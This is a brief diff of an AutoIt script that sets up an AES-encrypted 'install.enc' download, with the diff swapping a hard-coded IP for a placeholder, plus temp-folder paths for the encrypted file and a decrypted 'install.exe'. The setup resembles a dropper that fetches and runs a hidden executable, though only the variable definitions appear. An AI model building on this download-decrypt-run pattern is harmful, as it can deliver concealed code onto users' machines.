@@ -1,6 +1,6 @@
 #Include "aes.au3"
 
-$serverFile = "http://74.207.31.3/install.enc"
+$serverFile = "http://location/install.enc"
 $tmpEncFile = @TempDir & "\101_80085.enc"
 $exeFile = @TempDir & "\install.exe"
 
